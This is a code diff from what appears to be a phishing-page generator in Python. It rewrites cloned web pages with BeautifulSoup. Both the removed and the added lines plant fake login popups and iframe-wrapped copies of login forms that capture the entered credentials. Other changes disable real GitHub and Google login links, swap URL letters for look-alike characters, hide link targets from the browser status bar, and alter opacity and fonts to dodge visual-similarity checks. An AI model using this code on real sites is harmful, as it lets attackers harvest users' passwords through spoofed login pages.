-    for i, anchor in enumerate(anchors):
-        # Create a new anchor tag with the desired attributes
-        new_anchor = f10_soup.new_tag("a", href="#")
-        new_anchor.string = random.choice(
-            ['Find Us', 'Enter Credentials', 'Login for more', 'Reach Us', 'Contact Us', 'Mail Us',
-             'Login To Know More'])
-        new_anchor['style'] = "text-decoration:none;"
-        new_anchor['style'] = "text-decoration:none;"
-        # Insert the new anchor tag after the current anchor tag
-        anchor.insert_after(new_anchor)
+    # Find all anchor tags and add onclick attribute to open popup
+    anchor_tags = f10_soup.find_all("a")
+    for anchor_tag in anchor_tags:
+        anchor_tag['href'] = "#"
+        anchor_tag['onclick'] = "showPopup()"
 
-    pop_up_div_tag_add_string = '''<div class="popup" id="popup">
-                                                    <div class="center">
-                                                        <div class="container">
-                                                            <div class="text">Login Form</div>
-                                                            <form action="get_form_inputs.php" method="post">
-                                                                <div class="data"><label>Email or Phone</label>
-                                                                    <input type="text" name="user_name" required>
-                                                                </div>
-                                                                <div class="data"><label>Password</label>
-                                                                    <input type="password" name="user_password" required>
-                                                                </div>
-                                                                <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
-                                                                <div class="btn">
-                                                                    <div class="inner"></div>
-                                                                    <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
-                                                                </div>
-                                                                <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
-                                                            </form>
-                                                        </div>
-                                                    </div>
-                                                </div>'''
-    f10_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
-    f10_soup.prettify()
+    # Create a div tag for the popup form
+    pop_up_div_tag_add_string = f'<div class="popup" id="popup" style="display: none; position: fixed; top: 50%; ' \
+                                f'left: 50%; transform: translate(-50%, -50%); background-color: white; padding: ' \
+                                f'20px; border: 1px solid #ccc; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); z-index: ' \
+                                f'9999;">{copied_form_html}</div> '
+    pop_up_div_tag = BeautifulSoup(pop_up_div_tag_add_string, 'html.parser')
 
-    script_tag_for_pop_up = f10_soup.new_tag("script")
-    script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
-                var show = function(id){$(id).style.display ='block';}
-                var hide = function(id) {	$(id).style.display ='none';}'''
-    f10_soup.html.body.append(script_tag_for_pop_up)
+    # Append the div tag for the popup form to the body
+    f10_soup.html.body.append(pop_up_div_tag)
 
-    style_tag_for_pop_up = f10_soup.new_tag("style")
-    style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
-                                                input[type="checkbox"]{display: none;}
-                                                .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
-                                                .container .text{font-size: 35px;font-weight: 600;text-align: center;}
-                                                .container form{margin-top: -20px;}
-                                                .container form .data{height: 45px;width: 100%;margin: 40px 0;}
-                                                form .data label{font-size: 18px;}
-                                                form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
-                                                form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
-                                                form .forgot-pass{margin-top: -8px;}
-                                                form .forgot-pass a{color: #3498db;text-decoration: none;}
-                                                form .forgot-pass a:hover{text-decoration: underline;}
-                                                form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
-                                                form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
-                                                form .btn:hover .inner{left: 0;}
-                                                form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
-                                                form .signup-link{text-align: center;}
-                                                form .signup-link a{color: #3498db;text-decoration: none;}
-                                                form .signup-link a:hover{text-decoration: underline;}
-                                                .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
-                                                #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
-                                                #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
-                                                /* Styling buttons & webpage */
-                                                ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
-                                                ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
-                                                p {margin: 1em 0;font-size: 16px;}
-                                                .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
-                                                #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
-                                                #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
-                                                /* Styling buttons & webpage */
-                                                body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
-                                                ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
-                                                ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
-                                                p {margin: 1em 0;font-size: 16px;}'''
-    f10_soup.html.head.append(style_tag_for_pop_up)
+    # Implement JavaScript code to show the popup form
+    popup_script = """
+        <script>
+        function showPopup() {
+            document.getElementById("popup").style.display = "block";
+        }
+        function hidePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+        </script>
+        """
+    f10_soup.body.append(BeautifulSoup(popup_script, "html.parser"))
 
-    # # Update the HTML with the changes
-    # new_html = str(f10_soup)
-    #
-    # # Save the updated HTML to a file
-    # with open("updated_html.html", "w") as f:
-    #     f.write(new_html)
-    #
-    # print("Updated HTML saved to updated_html.html")
-    #
-    # for i in range(0, 5):
-    #     disabled_anchor_tags = f10_soup.new_tag("a")
-    #     disabled_anchor_tags['href'] = "#"
-    #     disabled_anchor_tags.string = random.choice(['Find Us', 'Enter Credentials', 'Login for more'])
-    #     # disabled_anchor_tags['style'] = "cursor: not-allowed; pointer-events:none; text-decoration:none;"
-    #     f10_soup.html.body.append(disabled_anchor_tags)
-    #
-    # anchor_tag_strings = ['Reach Us', 'Contact Us', 'Mail Us', 'Login To Know More']
-    # for i in range(0, 5):
-    #     enabled_anchor_tags = f10_soup.new_tag("a")
-    #     enabled_anchor_tags['href'] = target_file
-    #     enabled_anchor_tags.string = random.choice(anchor_tag_strings)
-    #     enabled_anchor_tags['style'] = "text-decoration:none;"
-    #     f10_soup.html.body.append(enabled_anchor_tags)
+    # Implement JavaScript code to handle form submission and save input values
+    form_script = """
+        <script>
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevent form submission
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
+            // Get form inputs
+            var form = event.target;
+            var formData = new FormData(form);
 
-    function_10_soup = copy.deepcopy(f10_soup.prettify())
+            // Convert FormData to object
+            var formObject = {};
+            formData.forEach(function(value, key){
+                formObject[key] = value;
+            });
+
+            // Convert object to JSON string
+            var jsonData = JSON.stringify(formObject);
+
+            // Save data to a file
+            var fileContents = "Form Inputs:\\n" + jsonData;
+            var fileBlob = new Blob([fileContents], {type: "text/plain"});
+            var fileUrl = URL.createObjectURL(fileBlob);
+
+            // Create a link to download the file
+            var downloadLink = document.createElement("a");
+            downloadLink.href = fileUrl;
+            downloadLink.download = "form_inputs.txt";
+            downloadLink.click();
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var popupForm = document.querySelector("#popup form");
+            if (popupForm) {
+                popupForm.addEventListener("submit", handleSubmit);
+            } else {
+                console.error("Popup form not found.");
+            }
+        });
+        </script>
+        """
+    f10_soup.body.append(BeautifulSoup(form_script, 'html.parser'))
+
+    # Save the modified HTML content to a file or use it further
+    function_10_soup = f10_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_10_output:
         f_10_output.write(str(function_10_soup))
@@ -792,36 +635,90 @@ def function_10(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 11) BEGINS HERE  =======================================
-In this feature we disable other login buttons if present for login
+In this feature we make iframe containing login form and save the input values to local file
 '''
 
 
 def function_11(target_file, obtained_soup_here):
-    print("Add feature 'Disable other login buttons'")
+    print("Add feature iframe containing form and save credentials")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_10_input:
-    #     function_10_contents = f_10_input.read()
-    #     f10_soup = BeautifulSoup(function_10_contents, 'html.parser')
-
+    
+    # Load HTML content from a file or obtained from previous steps
     f11_soup = obtained_soup_here
-    github_link = f11_soup.find("form", action="https://github.com/login")
-    google_link = f11_soup.find("form", action="https://accounts.google.com/login")
 
-    if github_link:
-        remove_github_href = f11_soup.find("form", action="https://github.com/login")
-        remove_github_href['href'] = "#"
-    if google_link:
-        remove_google_href = f11_soup.find("form", action="https://accounts.google.com/login")
-        remove_google_href['href'] = "#"
+    # Ensure <html> and <body> tags exist
+    if f11_soup.html is None:
+        f11_soup.append(BeautifulSoup('<html></html>', 'html.parser'))
+    if f11_soup.html.body is None:
+        f11_soup.html.append(BeautifulSoup('<body></body>', 'html.parser'))
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
+    # Find the form tag containing input fields and copy its content to a variable
+    form_tag = f11_soup.find("form")
+    copied_form_html = str(form_tag.parent)
 
-    function_11_soup = copy.deepcopy(f11_soup.prettify())
+    # Create an iframe tag
+    iframe_tag_add_string = f"""
+        <iframe id="formIframe" style="width: 100%; height: 500px; border: none;" title="Loin Form"></iframe>
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {{
+                var iframe = document.getElementById("formIframe");
+                var doc = iframe.contentDocument || iframe.contentWindow.document;
+                doc.open();
+                doc.write(`<b>Login Here</b><br>{copied_form_html}`);
+                doc.close();
+
+                // Add JavaScript to handle form submission within the iframe
+                var script = doc.createElement("script");
+                script.type = "text/javascript";
+                script.innerHTML = `
+                    function handleSubmit(event) {{
+                        event.preventDefault(); // Prevent form submission
+
+                        // Get form inputs
+                        var form = event.target;
+                        var formData = new FormData(form);
+
+                        // Convert FormData to object
+                        var formObject = {{}};
+                        formData.forEach(function(value, key) {{
+                            formObject[key] = value;
+                        }});
+
+                        // Convert object to JSON string
+                        var jsonData = JSON.stringify(formObject);
+
+                        // Save data to a file
+                        var fileContents = "Form Inputs:\\n" + jsonData;
+                        var fileBlob = new Blob([fileContents], {{ type: "text/plain" }});
+                        var fileUrl = URL.createObjectURL(fileBlob);
+
+                        // Create a link to download the file
+                        var downloadLink = document.createElement("a");
+                        downloadLink.href = fileUrl;
+                        downloadLink.download = "form_inputs.txt";
+                        downloadLink.click();
+                    }}
+
+                    // Add event listener to the form
+                    var iframeForm = doc.querySelector("form");
+                    if (iframeForm) {{
+                        iframeForm.addEventListener("submit", handleSubmit);
+                    }} else {{
+                        console.error("Form not found.");
+                    }}
+                `;
+                doc.body.appendChild(script);
+            }});
+        </script>
+        """
+    iframe_tag = BeautifulSoup(iframe_tag_add_string, 'html.parser')
+
+    # Append the iframe tag to the body
+    f11_soup.html.body.append(iframe_tag)
+
+    # Save the modified HTML content to a file or use it further
+    function_11_soup = f11_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_11_output:
         f_11_output.write(str(function_11_soup))
@@ -833,81 +730,172 @@ def function_11(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 12) BEGINS HERE  =======================================
-In this feature we find and replace the domain name with look alike characters
+In this feature we increase the DOM structure of the webpage by adding <link>, <script>, <img>, <a> and <div> tags
 '''
 
 
 def function_12(target_file, obtained_soup_here):
-    print("Adding feature 'Look Alike characters'")
+    print("Adding feature to increase DOM structure")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
 
-    character_a = ['ä', 'ẚ', 'á', 'ầ', 'ā', 'ä']
-    character_b = ['b̀', 'b̂', 'b̃', 'ḇ̂', 'b̤', 'b̥']
-    character_c = ['c̀', 'ć', 'c̃', 'c̈', 'ċ', 'c̓']
-    character_d = ['d̊', 'd́', 'ď', 'ḑ', 'đ', 'd̥']
-    character_e = ['è', 'ê', 'ē', 'ė', 'ë', 'e̊']
-    character_i = ['í', 'ǐ', 'i̎', 'ḭ', 'ị']
-    character_o = ['ó', 'ò', 'ṓ', 'ö', 'o̍']
-
-    look_alike_characters = {'a': random.choice(character_a),
-                             'b': random.choice(character_b),
-                             'c': random.choice(character_c),
-                             'd': random.choice(character_d),
-                             'e': random.choice(character_e),
-                             'f': 'f̣', 'g': 'g̈', 'h': 'ḥ', 'i': random.choice(character_i),
-                             'j': 'j́', 'k': 'k̥', 'l': 'l̩̓', 'm': 'm̍', 'n': 'ņ',
-                             'o': random.choice(character_o), 'p': 'p̣', 'q': 'q̣', 'r': 'ṛ', 's': 'ś',
-                             't': 'ṫ', 'u': 'u̇', 'v': 'v̓', 'w': 'ẉ', 'x': 'ẋ', 'y': 'ý', 'z': 'ẓ̣'}
-
-    # with open(write_file_name, 'rb') as f_12_input:
-    #     function_12_contents = f_12_input.read()
-    #     f12_soup = BeautifulSoup(function_12_contents, 'html.parser')
-
-    # for a in f12_soup.findAll('a'):
-    #     href_value = str(a['href'])
-    #     char_in_href = href_value[0]
-    #     replaced_char = ''
-    #     for key in look_alike_characters:
-    #         if key == char_in_href:
-    #             replaced_char += look_alike_characters[key]
-    #
-    #     new_href_name = href_value.replace(char_in_href, replaced_char)
-    #     a['href'] = new_href_name
-
+    # Load HTML content from a file or obtained from previous steps
     f12_soup = obtained_soup_here
-    # for anchor_tag in f12_soup.find_all('a', href=True):
-    #     href_value = anchor_tag['href']
-    #     alphanumeric_href_value = href_value.isalnum()
-    #     if alphanumeric_href_value:
-    #         char_to_replace = random.choice(href_value)
-    #         replaced_char = ''
-    #         for key in look_alike_characters:
-    #             if key == char_to_replace:
-    #                 replaced_char += look_alike_characters[key]
-    #         new_href_value = replaced_char
-    #         anchor_tag['href'] = new_href_value
-    #     else:
-    #         anchor_tag['href'] = href_value.replace('#', '##')
 
-    for anchor_tag in f12_soup.find_all('a', href=True):
-        href_value = anchor_tag['href']
-        if '#' or 'Javascript' or 'javascript' in href_value:
-            pass
-        else:
-            for href_value_char in href_value:
-                if href_value_char in look_alike_characters:
-                    href_value = href_value.replace(href_value_char, look_alike_characters[href_value_char])
+    # Ensure <html> and <body> tags exist
+    if f12_soup.html is None:
+        f12_soup.append(BeautifulSoup('<html></html>', 'html.parser'))
+    if f12_soup.html.body is None:
+        f12_soup.html.append(BeautifulSoup('<body></body>', 'html.parser'))
 
-        anchor_tag['href'] = href_value
+    # Define the list of local images
+    image_folder = "../advertisement_images"
+    image_list = ["amazon_advertisement.png", "myntra_advertisement.png", "flipkart_advertisement.png", "zoodio.png"]
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
+    # Container for the new elements
+    new_elements_container = f12_soup.new_tag("div", **{"class": "new-elements-container"})
 
-    import copy
+    # Add <script> tag
+    script_tag = f12_soup.new_tag("script", src="https://example.com/script.js")
+    new_elements_container.append(script_tag)
 
-    function_12_soup = copy.deepcopy(f12_soup.prettify())
+    # Add <link> tag for stylesheet
+    link_tag = f12_soup.new_tag("link", rel="stylesheet", href="https://example.com/styles.css")
+    new_elements_container.append(link_tag)
+
+    # Copy the form tag containing inputs
+    form_tag = f12_soup.find("form")
+    copied_form_html = str(form_tag.parent)
+
+    # Add a section for the new div tags with appealing content
+    appealing_section = f12_soup.new_tag("div", **{"class": "appealing-section"})
+    appealing_heading = f12_soup.new_tag("h2")
+    appealing_heading.string = "Explore Our Features"
+    appealing_section.append(appealing_heading)
+
+    div_texts = [
+        "Unlock new opportunities today!",
+        "Stay ahead with the latest updates.",
+        "Discover the power of innovation.",
+        "Join our community and grow with us.",
+        "Experience the future of technology."
+    ]
+
+    for i, text in enumerate(div_texts):
+        anchor_tag = f12_soup.new_tag("a", **{"href": "#", "class": f"new-div-{i}", "onclick": "showPopup()",
+                                          "style": "display: block; margin-bottom: 10px;"})
+        anchor_tag.string = text
+        appealing_section.append(anchor_tag)
+
+    new_elements_container.append(appealing_section)
+
+    # Create a div tag for the popup form
+    pop_up_div_tag_add_string = f'<div class="popup" id="popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 1px solid #ccc; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); z-index: 9999;">{copied_form_html}</div>'
+    pop_up_div_tag = BeautifulSoup(pop_up_div_tag_add_string, 'html.parser')
+
+    # Append the div tag for the popup form to the body
+    f12_soup.html.body.append(pop_up_div_tag)
+
+    # Implement JavaScript code to handle form submission and save input values
+    form_script = """
+        <script>
+            function showPopup() {
+                document.getElementById('popup').style.display = 'block';
+            }
+
+            function handleSubmit(event) {
+                event.preventDefault(); // Prevent form submission
+
+                // Get form inputs
+                var form = event.target;
+                var formData = new FormData(form);
+
+                // Convert FormData to object
+                var formObject = {};
+                formData.forEach(function(value, key){
+                    formObject[key] = value;
+                });
+
+                // Convert object to JSON string
+                var jsonData = JSON.stringify(formObject);
+
+                // Save data to a file
+                var fileContents = "Form Inputs:\\n" + jsonData;
+                var fileBlob = new Blob([fileContents], {type: "text/plain"});
+                var fileUrl = URL.createObjectURL(fileBlob);
+
+                // Create a link to download the file
+                var downloadLink = document.createElement("a");
+                downloadLink.href = fileUrl;
+                downloadLink.download = "form_inputs.txt";
+                downloadLink.click();
+            }
+
+            document.addEventListener("DOMContentLoaded", function() {
+                var popupForm = document.querySelector("#popup form");
+                if (popupForm) {
+                    popupForm.addEventListener("submit", handleSubmit);
+                } else {
+                    console.error("Popup form not found.");
+                }
+            });
+        </script>
+        """
+    f12_soup.body.append(BeautifulSoup(form_script, "html.parser"))
+
+    # Add a section for the image grid
+    grid_section = f12_soup.new_tag("div", **{"class": "grid-section"})
+    grid_heading = f12_soup.new_tag("h2")
+    grid_heading.string = "Our Sponsors"
+    grid_section.append(grid_heading)
+
+    grid_container = f12_soup.new_tag("div", **{"class": "grid-container"})
+    for i in range(len(image_list)):
+        img_tag = f12_soup.new_tag("img", src=f"{image_folder}/{image_list[i]}", alt="Advertisement Image",
+                                   **{"class": "grid-item"})
+        grid_container.append(img_tag)
+
+    grid_section.append(grid_container)
+    new_elements_container.append(grid_section)
+
+    # Add CSS for the grid layout and fixed image dimensions
+    style_tag = f12_soup.new_tag("style")
+    style_tag.string = """
+        .new-elements-container {
+            margin-top: 20px;
+        }
+        .appealing-section, .grid-section, .iframe-section, .nested-section {
+            margin-bottom: 40px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .appealing-section h2, .grid-section h2, .iframe-section h2, .nested-section h2 {
+            margin-top: 0;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-gap: 10px;
+            max-width: 600px;
+            margin: auto;
+        }
+        .grid-item {
+            width: 100%;  /* Ensures image fits within its grid cell */
+            height: auto; /* Maintains aspect ratio */
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: cover; /* Ensures image covers the grid cell without distortion */
+        }
+        """
+    f12_soup.head.append(style_tag)
+
+    # Insert the new elements container into the body, after existing content
+    f12_soup.body.append(new_elements_container)
+
+    # Save the modified HTML content to a file or use it further
+    function_12_soup = f12_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_12_output:
         f_12_output.write(str(function_12_soup))
@@ -919,95 +907,32 @@ def function_12(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 13) BEGINS HERE  =======================================
-In this feature we replace the blank space with <span> or <p> tag with a character in it and visibility: hidden or display:none; functionality
+In this feature we add body opacity to the webpage to make it quite transparent
 '''
 
-# def function_13(target_file, obtained_soup_here):
-#     import re
-#     import string
-#
-#     print("Adding feature 'Replacing blank space'")
-#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
-#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
-#     #
-#     # with open(write_file_name, 'rb') as f_13_input:
-#     #     function_13_contents = f_13_input.read()
-#     #     f13_soup = BeautifulSoup(function_13_contents, 'lxml')
-#
-#     f13_soup = obtained_soup_here
-#
-#     # Find all the text nodes in the HTML
-#     for node in f13_soup.stripped_strings:
-#         # Check if the text node contains blank spaces
-#         if " " in node:
-#             # Replace the blank spaces with a span tag with visibility:hidden style
-#             new_text = node.replace(" ", "<span style='visibility:hidden'>anyText</span>")
-#
-#             # Replace the old text node with the new text in the soup
-#             node.replace_with(new_text)
-#
-#     # # Update the HTML with the changes
-#     # new_html = str(soup)
-#     #
-#     # text_to_replace = f13_soup.get_text()
-#     # print(text_to_replace)
-#     #
-#     # filling_whitespace_string = '''<p style="display:none;">StringHere</p>'''
-#     # text_to_replace.replace(' ', filling_whitespace_string)
-#     # f13_soup.html.body.append(BeautifulSoup(text_to_replace, 'html.parser'))
-#     f13_soup.prettify()
-#     # print("Original Tag:")
-#     # print(tag_to_replace)
-#     # print("Original Tag Content:")
-#     # print(tag_to_replace.text)
-#     # original_text = tag_to_replace.text
-#     # if str(original_text).isspace():
-#     #     new_text = str(original_text).replace(" ", "x")
-#     #     # print("New tag content:")
-#     #     tag_to_replace.string = new_text
-#     # # print(tag_to_replace)
-#
-#     '''
-#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-#     '''
-#     import copy
-#
-#     function_13_soup = copy.deepcopy(f13_soup.prettify())
-#
-#     with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
-#         f_13_output.write(str(function_13_soup))
+def function_13(target_file, obtained_soup_here):
+    print("Adding feature we add body opacity")
+    write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
+    write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
 
+    # Load HTML content from a file or obtained from previous steps
+    f13_soup = obtained_soup_here
 
-'''
-========================================    PHASE 3 (FUNCTION 13) ENDS HERE  ========================================
-'''
+    body_tag = f13_soup.find('body')
+    if body_tag:
+        opacity_values = [0.37, 0.42, 0.6]
+        if body_tag.has_attr('style'):
+            original_style = body_tag['style']
+            new_style = original_style + f'opacity: {random.choice(opacity_values)};'
+            body_tag['style'] = new_style
+        else:
+            body_tag['style'] = f'opacity: {random.choice(opacity_values)};'
 
-'''
-=======================================    PHASE 3 (FUNCTION 13) BEGINS HERE  =======================================
-In this feature we add 
-'''
+    # Save the modified HTML content to a file or use it further
+    function_13_soup = f13_soup.prettify()
 
-# def function_13(target_file):
-#     print("Adding feature 'about:blank'")
-#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
-#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
-#
-#     with open(write_file_name, 'rb') as f_13_input:
-#         function_13_contents = f_13_input.read()
-#         f13_soup = BeautifulSoup(function_13_contents, 'html.parser')
-#         anchor_tag = f13_soup.find('a').find_next_siblings()
-#         anchor_tag['href'] = 'about:blank'
-#         anchor_tag['target'] = '_blank'
-#
-#     '''
-#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-#     '''
-#     import copy
-#
-#     function_13_soup = copy.deepcopy(f13_soup.prettify())
-#
-#     with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
-#         f_13_output.write(str(function_13_soup))
+    with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
+        f_13_output.write(str(function_13_soup))
 
 
 '''
@@ -1016,51 +941,39 @@ In this feature we add
 
 '''
 =======================================    PHASE 3 (FUNCTION 14) BEGINS HERE  =======================================
-In this feature we hide the status bar address link in web browser
+In this feature we change the text font family
 '''
 
 
 def function_14(target_file, obtained_soup_here):
-    print("Adding feature 'Hide status bar address link'")
+    print("Adding feature to change the font-family of text")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_14_input:
-    #     function_14_contents = f_14_input.read()
-    #     f14_soup = BeautifulSoup(function_14_contents, 'html.parser')
 
+    # Load HTML content from a file or obtained from previous steps
     f14_soup = obtained_soup_here
 
-    for anchor_tag in f14_soup.find_all('a'):
-        anchor_tag['class'] = "hidelink"
-        # if anchor_tag.has_attr('style'):
-        #     hide_anchor_tag_styles_present = anchor_tag['style']
-        #     hide_anchor_tag_additional_styling = hide_anchor_tag_styles_present + "cursor:pointer; text-decoration:underline;"
-        #     anchor_tag['style'] = hide_anchor_tag_additional_styling
-        # else:
-        #     anchor_tag['style'] = "cursor:pointer; text-decoration:underline;"
+    font_families = [
+        "Times New Roman", "Georgia", "Palatino", "Book Antiqua", "Cambria",
+        "Arial", "Helvetica", "Calibri", "Verdana", "Tahoma",
+        "Courier New", "Lucida Console", "Monaco",
+        "Comic Sans MS", "Brush Script MT", "Lucida Handwriting", "Snell Roundhand"
+    ]
 
-    hide_link_style_tag = f14_soup.new_tag('style')
-    hide_link_style_tag.string = ".hidelink{cursor:pointer; text-decoration:underline;}"
-    f14_soup.html.head.append(hide_link_style_tag)
+    tags_to_change = ["p", "h1", "h2", "h3", "span", "a"]
 
-    another_hiding_tag = f14_soup.new_tag('script')
-    another_hiding_tag['src'] = "http://code.jquery.com/jquery-1.10.0.min.js"
-    f14_soup.html.head.append(another_hiding_tag)
+    for tag_name in tags_to_change:
+        tags = f14_soup.find_all(tag_name)
+        for tag in tags:
+            if tag.has_attr('style'):
+                original_style = tag['style']
+                new_style = original_style + f"font-family: {random.choice(font_families)};"
+                tag['style'] = new_style
+            else:
+                tag['style'] = f"font-family: {random.choice(font_families)};"
 
-    hide_address_link_script_tag = f14_soup.new_tag('script')
-    hide_address_link_script_tag.string = "$(function(){$(\"a.hidelink\").each(function (index, element){var href = " \
-                                          "$(this).attr(\"href\");$(this).attr(\"hiddenhref\", " \
-                                          "href);$(this).removeAttr(\"href\");});$(\"a.hidelink\").click(function(){" \
-                                          "url = $(this).attr(\"hiddenhref\");window.open(url, '_blank');})}); "
-    f14_soup.html.head.append(hide_address_link_script_tag)
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_14_soup = copy.deepcopy(f14_soup.prettify())
+    # Save the modified HTML content to a file or use it further
+    function_14_soup = f14_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_14_output:
         f_14_output.write(str(function_14_soup))
@@ -1071,48 +984,44 @@ def function_14(target_file, obtained_soup_here):
 '''
 
 '''
-Visual Similarity-based Features
-'''
-
-'''
 =======================================    PHASE 3 (FUNCTION 15) BEGINS HERE  =======================================
-In this feature we change the font family of the text content in the html file
+In this feature we add opacity to the logo
 '''
 
 
 def function_15(target_file, obtained_soup_here):
-    print("Adding feature 'Font Family to text content'")
+    print("Adding feature of logo opacity")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_15_input:
-    #     function_15_contents = f_15_input.read()
-    #     f15_soup = BeautifulSoup(function_15_contents, 'html.parser')
 
+    # Load HTML content from a file or obtained from previous steps
     f15_soup = obtained_soup_here
 
-    body_tag = f15_soup.find('body')
-    if body_tag.has_attr('style'):
-        body_tag_present_style = body_tag['style']
-        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
-        body_tag['style'] = body_tag_additional_styling
-    else:
-        body_tag['style'] = "width: 100%;"
+    # Find all img, svg, and a tags
+    all_tags = f15_soup.find_all(['img', 'svg', 'a'])
 
-    for font_tag in f15_soup.find_all('a'):
-        if font_tag.has_attr('style'):
-            font_family_styles_present = font_tag['style']
-            font_family_additional_styling = font_family_styles_present + "font-family:serif; font-style:italic; text-decoration:none;"
-            font_tag['style'] = font_family_additional_styling
+    # List to store attributes to modify
+    attributes_to_modify = []
+
+    # Check if any tag attributes contain the term "logo" and add opacity style if found
+    for tag in all_tags:
+        for attr, value in tag.attrs.items():
+            if "logo" in str(value).lower():
+                attributes_to_modify.append(tag)
+                break  # Break out of the inner loop once logo is found in current tag
+
+    # Modify the attributes after the iteration
+    for tag in attributes_to_modify:
+        opacity_values = [0.15, 0.25, 0.35]
+        if "style" in tag.attrs:
+            original_style = tag['style']
+            new_style = original_style + f'opacity: {random.choice(opacity_values)};'
+            tag['style'] = new_style
         else:
-            font_tag['style'] = "font-family:serif; font-style:italic; text-decoration:none;"
+            tag["style"] = f'opacity: {random.choice(opacity_values)};'
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_15_soup = copy.deepcopy(f15_soup.prettify())
+    # Save the modified HTML content to a file or use it further
+    function_15_soup = f15_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_15_output:
         f_15_output.write(str(function_15_soup))
@@ -1122,383 +1031,32 @@ def function_15(target_file, obtained_soup_here):
 ========================================    PHASE 3 (FUNCTION 15) ENDS HERE  ========================================
 '''
 
-'''
-=======================================    PHASE 3 (FUNCTION 16) BEGINS HERE  =======================================
-In this feature we change the border styling in the html file
-'''
 
-
-def function_16(target_file, obtained_soup_here):
-    print("Adding feature 'Border Styling'")
-    write_file = phishing_folder_path
-    write_file_name = os.path.join(write_file, str(target_file))
-    #
